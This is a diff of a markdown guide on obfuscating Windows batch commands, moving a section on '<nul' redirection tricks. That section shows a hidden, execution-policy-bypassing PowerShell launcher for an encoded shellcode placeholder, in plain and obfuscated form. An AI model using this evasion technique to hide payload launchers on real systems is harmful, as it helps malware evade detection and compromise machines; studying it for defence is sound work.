@@ -57,6 +57,19 @@ The above string can be obfuscated using the **batch special character: ^** <br 
 
 ---
 
+      Using a batch redirection caret (<nul) to 'escape' tokens.
+      'If you place a token at the caret the token is removed'.
+
+- String command to obfuscate<br />
+`cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode`
+
+- String obfuscated (**<nul**) special character.<br />
+`cmd.exe /c <nul powershell.exe <nul -nop -wind hidden -Exec Bypass -noni -enc $shellcode`
+
+![batch obfuscation](http://i.cubeupload.com/cu5bpj.jpg)
+
+---
+
       Obfuscating windows batch files using undefined environmental variables.
       Inside .bat files undefined environmental variables are expanded to empty
       strings. Since cmd.exe allows using variables inside commands.
@@ -94,19 +107,6 @@ The above string can be obfuscated using the **batch special character: ^** <br 
 
 - Description of %varObj% master_key:<br />
 https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/pedro-Wandoelmo-key.md
-
----
-
-      Using a batch redirection caret (<nul) to 'escape' tokens.
-      'If you place a token at the caret the token is removed'.
-
-- String command to obfuscate<br />
-`cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode`
-
-- String obfuscated (**<nul**) special character.<br />
-`cmd.exe /c <nul powershell.exe <nul -nop -wind hidden -Exec Bypass -noni -enc $shellcode`
-
-![batch obfuscation](http://i.cubeupload.com/cu5bpj.jpg)
 
 ---
 
